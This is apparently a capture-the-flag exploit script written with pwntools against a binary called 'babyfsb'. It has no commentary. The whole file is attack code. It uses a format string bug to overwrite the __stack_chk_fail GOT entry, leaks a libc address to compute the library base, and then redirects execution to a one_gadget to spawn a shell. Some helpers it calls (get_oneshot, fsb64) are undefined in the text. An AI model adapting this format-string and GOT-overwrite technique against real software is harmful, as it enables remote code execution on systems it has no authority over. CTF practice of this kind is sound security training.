#!/usr/bin/python 
from pwn import *

p = process("./babyfsb")
elf = ELF("./babyfsb")
libc = ELF("./libc.so.6")
main = elf.symbols['main']
one_gadget_offset = get_oneshot['./libc.so.6']
stack_chk_fail_got = elf.got['__stack_chk_fail']

pay = fsb64(6, stack_chk_fail_got, main)

p.sendafter("hello\n", pay)

pay = '%25$p'
pay += 'A'*(64 - len(pay))
p.sendafter("hello\n", pay)

leak = int(p.recv(14), 16)
libcBase = leak - libc.symbols['__libc_start_main'] - 240
one_gadget = libcBase + 0x45216

p.sendafter("hello\n", fsb64(6, stack_chk_fail_got, one_gadget))

p.interactive()
